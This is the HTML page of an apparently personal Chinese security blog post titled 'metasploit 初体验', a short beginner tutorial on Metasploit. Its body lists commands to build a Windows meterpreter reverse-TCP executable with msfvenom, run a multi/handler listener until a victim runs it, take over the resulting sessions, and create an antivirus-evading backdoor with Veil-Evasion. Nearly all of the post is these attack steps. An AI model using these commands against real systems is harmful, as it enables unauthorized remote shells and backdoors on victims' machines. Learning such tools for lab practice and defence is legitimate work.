@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>metasploit 初体验 | b1ng0&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：新开终端msfvenom -lmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件 2.监听：进入metasploitus">
+<meta name="keywords" content="metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metasploit 初体验">
+<meta property="og:url" content="http://b1ng0.top/2017/02/06/metasploit初体验/index.html">
+<meta property="og:site_name" content="b1ng0&#39;s blog">
+<meta property="og:description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：新开终端msfvenom -lmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件 2.监听：进入metasploitus">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-05-19T12:00:32.546Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="metasploit 初体验">
+<meta name="twitter:description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：新开终端msfvenom -lmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件 2.监听：进入metasploitus">
+  
+    
+      
+        <link rel="alternate" type="application/atom+xml" title="b1ng0&#39;s blog" href="/atom.xml">
+      
+    
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/typing.css">
+  <link rel="stylesheet" href="/css/donate.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  
+</head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-metasploit初体验" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">b1ng0</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      metasploit 初体验
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <h1 id="msf简单使用：-以windows-meterpreter-reverse-tcp为例"><a href="#msf简单使用：-以windows-meterpreter-reverse-tcp为例" class="headerlink" title="msf简单使用：(以windows/meterpreter/reverse_tcp为例)"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id="1-payload设置："><a href="#1-payload设置：" class="headerlink" title="1.payload设置："></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>
+<h2 id="2-监听："><a href="#2-监听：" class="headerlink" title="2.监听："></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p>
+<h2 id="3-插入攻击荷载"><a href="#3-插入攻击荷载" class="headerlink" title="3.插入攻击荷载"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p>
+<h2 id="4-使用run-或者-exploit-启动攻击"><a href="#4-使用run-或者-exploit-启动攻击" class="headerlink" title="4.使用run 或者 exploit 启动攻击"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p>
+<p>==============================</p>
+<h1 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h1><h2 id="使用veil-veasion生成后门："><a href="#使用veil-veasion生成后门：" class="headerlink" title="使用veil-veasion生成后门："></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p>
+<p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>
+<p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>
+
+      
+      
+    </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2017/02/06/metasploit初体验/" class="article-date">
+  <time class="dt-published" datetime="2017-02-06T10:09:00.000Z" itemprop="datePublished">2017-02-06</time>
+</a>
+
+        </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/">metasploit</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2017/02/28/关于php比较运算符/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          关于php比较运算符
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/01/14/hello world/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+       
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+<script src="/js/typing.js"></script>
+<!--[if lt IE 9]><script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script><![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
+</html>
